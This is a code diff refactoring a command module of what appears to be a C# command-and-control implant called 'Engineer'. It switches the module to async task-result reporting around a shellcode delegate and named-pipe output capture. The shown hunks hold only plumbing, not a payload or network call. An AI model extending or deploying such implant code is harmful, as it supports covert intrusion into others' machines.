@@ -16,6 +16,7 @@ using static Engineer.Extra.WinAPIs;
 using static Engineer.Extra.WinAPIs.Kernel32;
 using Microsoft.Win32.SafeHandles;
 using static System.Net.WebRequestMethods;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -28,7 +29,7 @@ namespace Engineer.Commands
         public static StreamWriter writer = new StreamWriter(Ms);
         public delegate void ShellcodeDelegate(string[] output);
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             // use Console.SetOut() to redirect the output to the TextWriter
 
@@ -59,7 +60,8 @@ namespace Engineer.Commands
             if (pipeHandle == null)
             {
                 Console.WriteLine("Failed to create pipe");
-                return "Failed to create pipe";
+                Tasking.FillTaskResults("Failed to create pipe", task, EngTaskStatus.FailedWithWarnings);
+                return;
             }
 
             //use create file api call in the new named pipe address
@@ -82,7 +84,8 @@ namespace Engineer.Commands
             if (!setHadnleSuccess)
             {
                 Console.WriteLine("Failed to redirect output");
-                return "Failed to redirect output";
+                Tasking.FillTaskResults("Failed to redirect output", task, EngTaskStatus.FailedWithWarnings);
+                return;
             }
 
             try
@@ -119,8 +122,8 @@ namespace Engineer.Commands
                 Console.SetOut(stdOut);
                 Console.SetError(stdErr);
             }
-            
-            return output;
+
+            Tasking.FillTaskResults(output, task, EngTaskStatus.Complete);
         }
     }
 }
